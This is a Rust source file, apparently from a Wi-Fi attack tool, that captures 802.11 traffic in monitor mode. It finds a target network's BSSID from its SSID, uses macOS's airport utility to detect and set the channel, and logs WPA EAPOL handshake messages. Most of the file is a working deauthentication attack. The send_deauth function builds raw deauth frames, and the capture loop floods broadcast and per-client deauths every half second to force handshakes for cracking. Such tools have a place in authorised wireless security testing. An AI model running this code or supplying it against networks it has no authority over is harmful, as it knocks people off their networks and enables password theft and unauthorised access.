use anyhow::{Result, Context, anyhow};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use std::collections::HashMap;
use colored::Colorize;
use pcap::{Capture};
use crate::handshake::extract_eapol_from_packet;

/// Capture traffic to a file
///
/// If `ssid` is provided, it attempts to:
/// 1. Find the BSSID (AP MAC) from Beacon/ProbeResponse frames
/// 2. Send deauthentication frames to connected clients to force a handshake
pub fn capture_traffic(interface: &str, channel: Option<u32>, ssid: Option<&str>, output_file: &str, duration: Option<u64>) -> Result<()> {
    println!("{}", "📡 Starting packet capture (Pure Rust + libpcap)...".cyan());
    println!("Interface: {}", interface.yellow());
    println!("Output: {}", output_file.yellow());
    if let Some(target) = ssid {
         println!("Target SSID: {}", target.green());
         println!("{}", "⚡ Active Deauth Attack: ENABLED".red().bold());
    }
    
    // Auto-detect channel if not provided and SSID is present
    let mut channel_to_use = channel;
    if channel.is_none() {
        if let Some(target_ssid) = ssid {
            println!("{}", "🔍 Auto-detecting channel...".cyan());
            if let Some(detected_ch) = detect_channel_for_ssid(target_ssid) {
                println!("{}", format!("✓ Found '{}' on Channel {}", target_ssid, detected_ch).green().bold());
                channel_to_use = Some(detected_ch);
                
                // Attempt to set channel (macOS specific)
                println!("{}", format!("  Attempting to set channel to {}...", detected_ch).dimmed());
                set_channel_macos(interface, detected_ch);
            } else {
                println!("{}", format!("⚠️  Could not detect channel for '{}'. capture might fail if not on correct channel.", target_ssid).yellow());
            }
        }
    }

    if let Some(ch) = channel_to_use {
        println!("{}", format!("ℹ️  Monitoring on Channel {}", ch).cyan());
    } else {
        println!("{}", "Note: Channel switching is not supported in pure-capture mode.".dimmed());
        println!("{}", "⚠️  Please set channel manually (external tool/OS) if needed.".yellow());
    }

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    }).ok();

    // Open capture
    let mut cap = Capture::from_device(interface)
        .context("Failed to find device")?
        .promisc(true)
        .rfmon(true) // Critical for monitor mode
        .timeout(100) // 100ms timeout for read
        .open()
        .map_err(|e| anyhow!("Failed to open capture device: {}", e))?;
    
    // We need to enable sending if possible (some systems require separate handle)
    // But pcap usually allows sending on same handle.
    // However, on macOS/BSD, injection usually requires "Link Layer" access, 
    // which pcap provides but drivers might block 802.11 management frames.

    let mut savefile = cap.savefile(output_file)
        .context("Failed to create output file")?;

    println!("{}", "🟢 Capturing... (Press Ctrl+C to stop)".green());

    let start = std::time::Instant::now();
    let mut packets_count = 0;
    
    // State for deauth attack
    let mut target_bssid: Option<[u8; 6]> = None;
    let mut last_deauth = std::time::Instant::now();
    // Helper to find BSSID from SSID if needed
    let target_ssid_bytes = ssid.map(|s| s.as_bytes());

    // State for handshake detection
    let mut pending_handshakes: HashMap<[u8; 6], [u8; 32]> = HashMap::new(); // Client Mac -> Anonce (from M1)

    while running.load(Ordering::SeqCst) {
        if let Some(d) = duration {
            if start.elapsed().as_secs() >= d {
                break;
            }
        }

        // 1. Capture packet
        match cap.next_packet() {
            Ok(packet) => {
                // Save to file
                savefile.write(&packet);
                packets_count += 1;
                
                // Handshake Detection
                if let Some(eapol) = extract_eapol_from_packet(packet.data) {
                    // Check if this EAPOL belongs to our target (if we have one)
                    let is_target = match target_bssid {
                        Some(b) => eapol.ap_mac == b,
                        None => true // If no target specific, accept any
                    };

                    if is_target {
                        match eapol.message_type {
                            1 => {
                                // M1: Store Anonce
                                if let Some(anonce) = eapol.anonce {
                                    pending_handshakes.insert(eapol.client_mac, anonce);
                                    println!("\n{}", format!("🔑 M1 (ANonce) - AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                        eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                        eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                        eapol.replay_counter
                                    ).blue().bold());
                                }
                            },
                            2 => {
                                // M2: Check if we have M1
                                println!("\n{}", format!("🔐 M2 (SNonce+MIC) - Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.replay_counter
                                ).cyan().bold());

                                if let Some(_stored_anonce) = pending_handshakes.get(&eapol.client_mac) {
                                    println!("\n{}", format!("🎉 COMPLETE HANDSHAKE (M1+M2) for Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                        eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5]
                                    ).green().bold());
                                    println!("{}", "💾 Handshake saved! Stop capturing (Ctrl+C) and start cracking.".green());

                                    // Don't break automatically - let user decide
                                } else {
                                    println!("{}", "   ⚠️  M2 without matching M1 (might be out of order)".yellow());
                                }
                            },
                            3 => {
                                println!("\n{}", format!("🔄 M3 - AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.replay_counter
                                ).dimmed());
                            },
                            4 => {
                                println!("\n{}", format!("✅ M4 - Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.replay_counter
                                ).dimmed());
                            },
                            _ => {
                                println!("\n{}", format!("❓ Unknown EAPOL type {} from {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                    eapol.message_type,
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5]
                                ).yellow());
                            }
                        }
                    } else {
                        // EAPOL from different AP
                        println!("\n{}", format!("📦 EAPOL M{} from different AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (ignored)",
                            eapol.message_type,
                            eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5]
                        ).dimmed());
                    }
                }

                if packets_count % 50 == 0 {
                    let elapsed = start.elapsed().as_secs();
                    let rate = if elapsed > 0 { packets_count / elapsed as u64 } else { 0 };
                    print!("\r📦 Packets: {} | Rate: {}/s | M1s: {} | Elapsed: {}s   ",
                        packets_count,
                        rate,
                        pending_handshakes.len(),
                        elapsed
                    );
                    use std::io::Write;
                    std::io::stdout().flush().unwrap();
                }

                // Discovery Logic: Find BSSID if we have a target SSID but no BSSID yet
                if let Some(target_ssid) = target_ssid_bytes {
                    if target_bssid.is_none() {
                        if let Some(bssid) = parse_bssid_from_packet(packet.data, target_ssid) {
                            target_bssid = Some(bssid);
                            println!("\n{}", format!("🎯 Found Target BSSID: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}", 
                                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]).green().bold());
                            println!("🚀 Starting deauthentication flood...");
                        }
                    }
                }
            },
            Err(pcap::Error::TimeoutExpired) => {
                // Timeout is fine, lets us check deauth timer
            },
            Err(e) => {
                // Some errors might be recoverable
                eprintln!("\nRead warning: {}", e);
            }
        }

        // 2. Deauth Attack Logic
        // Send deauth burst every 0.5 seconds if we have a target
        if let Some(bssid) = target_bssid {
             if last_deauth.elapsed() >= Duration::from_millis(500) {
                // Send deauth frames (Burst)
                for _ in 0..3 {
                    // 1. Broadcast Deauth
                    let _ = send_deauth(&mut cap, &bssid, &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
                    
                    // 2. Targeted Deauth for known clients
                    for client in pending_handshakes.keys() {
                        let _ = send_deauth(&mut cap, &bssid, client);
                    }
                }
                last_deauth = std::time::Instant::now();
            }
        }
    }

    println!("\n{}", "🛑 Capture stopped.".red());
    println!("Total packets: {}", packets_count);
    
    Ok(())
}

/// Parse BSSID from a raw 802.11 packet if it matches the SSID
fn parse_bssid_from_packet(data: &[u8], target_ssid: &[u8]) -> Option<[u8; 6]> {
    // Basic check for radiotap header
    if data.len() < 50 { return None; }
    
    // Skip Radiotap (variable length)
    // First byte is version, second pad. 2-3 is length.
    let radiotap_len = u16::from_le_bytes([data[2], data[3]]) as usize;
    if data.len() < radiotap_len + 24 { return None; }
    
    let frame = &data[radiotap_len..];
    
    // Frame Control: Type 0 = Management
    // Subtype 8 = Beacon, 5 = Probe Response
    let fc = frame[0];
    let f_type = (fc >> 2) & 0x3;
    let f_subtype = (fc >> 4) & 0xF;
    
    if f_type != 0 { return None; } // Not management
    if f_subtype != 8 && f_subtype != 5 { return None; } // Not Beacon/ProbeResp
    
    // Management Frame Format:
    // FC(2) Dur(2) Addr1(6) Addr2(6) Addr3(6) Seq(2) Body...
    // Addr1 = Destination
    // Addr2 = Source (Transmitter/AP in Beacon)
    // Addr3 = BSSID (AP in Beacon)
    
    let bssid: [u8; 6] = frame[16..22].try_into().ok()?;
    
    // Body starts at 24
    let body = &frame[24..];
    
    // Fixed Parameters:
    // Timestamp (8) + Beacon Interval (2) + Cap Info (2) = 12 bytes
    if body.len() < 12 { return None; }
    
    let tags = &body[12..];
    let mut i = 0;
    while i < tags.len() {
        if i + 2 > tags.len() { break; }
        let id = tags[i];
        let len = tags[i+1] as usize;
        let val_start = i + 2;
        let val_end = val_start + len;
        
        if val_end > tags.len() { break; }
        
        if id == 0 { // SSID Tag
            let packet_ssid = &tags[val_start..val_end];
            if packet_ssid == target_ssid {
                return Some(bssid);
            }
            // Found SSID tag but didn't match, stop looking in this packet
            return None; 
        }
        
        i = val_end;
    }
    
    None
}

/// Construct and send a Deauth frame
fn send_deauth(cap: &mut Capture<pcap::Active>, bssid: &[u8; 6], target: &[u8; 6]) -> Result<()> {
    // 802.11 Deauthentication Frame
    // 26 bytes header
    // Reason Code (2 bytes)
    
    let mut frame = Vec::with_capacity(26 + 2);
    
    // Frame Control: Type 0 (Mgmt), Subtype 12 (0xC - Deauth)
    // 0xC0 (Subtype C, Type 0. Bits: 00 1100 00) -> 1100 0000 = 0xC0
    frame.push(0xC0); 
    frame.push(0x00); // Flags
    
    // Duration
    frame.extend_from_slice(&[0x00, 0x01]); // Short duration
    
    // Addr1: Destination
    frame.extend_from_slice(target);
    
    // Addr2: Source (AP BSSID)
    frame.extend_from_slice(bssid);
    
    // Addr3: BSSID (AP BSSID)
    frame.extend_from_slice(bssid);
    
    // Sequence Control (Fragment 0, Seq 0)
    frame.extend_from_slice(&[0x00, 0x00]);
    
    // Frame Body:
    // Reason Code: 7 (Class 3 frame received from nonassociated STA)
    // 0x0007 (Little Endian? No, Management fields are usually LE)
    frame.extend_from_slice(&[0x07, 0x00]); 
    
    // Note: We are sending a "Raw 802.11" frame.
    // However, the interface might expect a Radiotap header if it's in monitor mode!
    // Most drivers in monitor mode expect Radiotap + 802.11.
    // Let's prepend a minimal Radiotap header.
    
    let mut packet = Vec::new();
    
    // Minimal Radiotap Header
    // Version 0, Pad 0, Len 8, Present 0 (No fields)
    packet.extend_from_slice(&[0x00, 0x00]); // Version/Pad
    packet.extend_from_slice(&[0x08, 0x00]); // Length 8
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Present flags (None)
    
    packet.extend_from_slice(&frame);
    
    match cap.sendpacket(packet) {
        Ok(_) => Ok(()),
        Err(e) => Err(anyhow!("Send error: {}", e))
    }
}

/// Detect channel for a given SSID using macOS airport utility
fn detect_channel_for_ssid(ssid: &str) -> Option<u32> {
    use std::process::Command;
    
    // Path to airport utility
    let airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
    
    let output = Command::new(airport_path)
        .arg("-s")
        .arg(ssid)
        .output()
        .ok()?;
        
    if !output.status.success() {
        return None;
    }
    
    let stdout = String::from_utf8_lossy(&output.stdout);
    
    // Parse output
    // Format:
    // SSID BSSID RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
    // MyWiFi 00:11:22... -50 6 Y US ...
    
    for line in stdout.lines().skip(1) { // Skip header
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 4 {
            // Check if SSID matches
            if line.contains(ssid) {
                // Find index of BSSID (regex like [0-9a-fA-F:]{17})
                let bssid_idx = parts.iter().position(|p| p.contains(':') && p.len() == 17);
                if let Some(idx) = bssid_idx {
                    if idx + 2 < parts.len() {
                        let potential_channel = parts[idx + 2];
                        if let Ok(ch) = potential_channel.parse::<u32>() {
                            return Some(ch);
                        }
                    }
                }
            }
        }
    }
    
    None
}

/// Set channel on macOS using airport utility
fn set_channel_macos(_interface: &str, channel: u32) {
    use std::process::Command;
    
    // airport -c{channel}
    // Note: It usually defaults to en0/current interface.
    // If _interface is provided, we can't easily force it with airport tool unless we use networksetup but networksetup doesn't set monitor channel easily.
    // airport -c is the standard way for debug/monitor.
    
    let airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
    
    let _ = Command::new(airport_path)
        .arg(format!("--channel={}", channel))
        .output();
}


